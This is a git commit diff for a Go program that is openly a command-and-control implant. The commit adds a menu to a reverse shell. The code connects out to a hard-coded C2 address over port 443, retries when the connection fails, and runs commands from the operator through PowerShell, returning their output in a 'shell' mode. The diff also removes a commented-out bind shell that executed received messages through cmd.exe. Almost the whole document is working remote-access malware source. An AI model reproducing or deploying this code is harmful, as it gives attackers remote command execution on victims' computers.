27ad1b651d37662ac374cb6d2f2a83074a545506
fistfulOfHummus <98347396+fistfulofhummus@users.noreply.github.com>
2024-02-29 23:42:31 +0200

    Added a menu

--- main.go
+++ main.go
@@ -9,22 +9,21 @@ import (
 )
 
 func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
+	if *attempts > 3 {
+		terminate()
+	}
 	addr, err := net.Dial("tcp", *c2Address)
 	if err != nil {
 		fmt.Println("Couldn't establish a connection")
-		if *attempts == 3 {
-			fmt.Println("Error Number of attempts exceeded 3")
-			os.Exit(0)
-		}
-		time.Sleep(3 * time.Second)
 		*attempts = *attempts + 1
-		callHome(c2Address, attempts)
+		time.Sleep(10 * time.Second)
+		return addr, false
 	}
 	addr.Write([]byte("Success\n"))
 	return addr, true
 }
 
-func listen4Commands(conn net.Conn) string {
+func listen4Commands(conn net.Conn, implantWD *string) string {
 	request := make([]byte, 128)
 	read_len, err := conn.Read(request)
 	if read_len == 0 {
@@ -38,105 +37,56 @@ func listen4Commands(conn net.Conn) string {
 }
 
 func executeCommands(conn net.Conn, command string) {
-	fmt.Println("The command to be executed is " + command)
 	if command == "stop\n" {
 		terminate()
 	}
-	//cmd := exec.Command("cmd.exe", "/C", command)
 	cmd := exec.Command("powershell.exe", "/C", command)
 	output, err := cmd.Output()
 	if err != nil {
-		fmt.Println("Couldnt Exec Command")
+		fmt.Println("Couldn't Exec Command")
 	}
 	if len(output) < 1 {
 		output = []byte("Couldn't execute the command\n")
 	}
 	conn.Write(output)
+	//conn.Write([]byte("PS > "))
 }
 
 func terminate() {
 	fmt.Println("Terminating Implant")
-	time.Sleep(3 * time.Second)
+	time.Sleep(1 * time.Second)
 	os.Exit(0)
 }
 
 func main() {
 	c2Address := "192.168.0.106:443"
 	attempts := 0
+	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
 	conn, result := callHome(&c2Address, &attempts)
-	if !result {
-		os.Exit(0)
+	for !result {
+		conn, result = callHome(&c2Address, &attempts)
 	}
-	//conn.Close() why would you ?
 	for {
-		command := listen4Commands(conn)
-		executeCommands(conn, command)
+		conn.Write([]byte("RayTerpreter $ "))
+		command := listen4Commands(conn, &implantWD)
+		switch command {
+		case "shell\n":
+			{
+				for {
+					conn.Write([]byte("PS > "))
+					command = listen4Commands(conn, &implantWD)
+					if command == "bg\n" {
+						break
+					}
+					executeCommands(conn, command)
+				}
+			}
+		case "stop\n":
+			terminate()
+		default:
+			conn.Write([]byte("Available Commands: shell, stop\n"))
+		}
 	}
 	//time.Sleep(10 * time.Second)
 }
-
-// package main
-
-// import (
-//     "fmt"
-//     "net"
-//     "os/exec"
-// )
-
-// func main() {
-//     // Define the port to listen on
-//     port := ":8080"
-
-//     // Start TCP server
-//     ln, err := net.Listen("tcp", port)
-//     if err != nil {
-//         fmt.Println("Error listening:", err.Error())
-//         return
-//     }
-//     defer ln.Close()
-//     fmt.Println("Listening on", port)
-
-//     // Accept connections
-//     for {
-//         conn, err := ln.Accept()
-//         if err != nil {
-//             fmt.Println("Error accepting connection:", err.Error())
-//             return
-//         }
-
-//         // Handle connection in a new goroutine
-//         go handleConnection(conn)
-//     }
-// }
-
-// func handleConnection(conn net.Conn) {
-//     defer conn.Close()
-
-//     // Read message from the connection
-//     buffer := make([]byte, 1024)
-//     n, err := conn.Read(buffer)
-//     if err != nil {
-//         fmt.Println("Error reading:", err.Error())
-//         return
-//     }
-
-//     // Convert received bytes to string
-//     message := string(buffer[:n])
-//     fmt.Println("Received message:", message)
-
-//     // Execute the received message as a command
-//     cmd := exec.Command("cmd.exe", "/C", message)
-//     output, err := cmd.CombinedOutput()
-//     if err != nil {
-//         fmt.Println("Error executing command:", err.Error())
-//         return
-//     }
-
-//     // Send the command output back to the client
-//     _, err = conn.Write(output)
-//     if err != nil {
-//         fmt.Println("Error sending response:", err.Error())
-//         return
-//     }
-// }
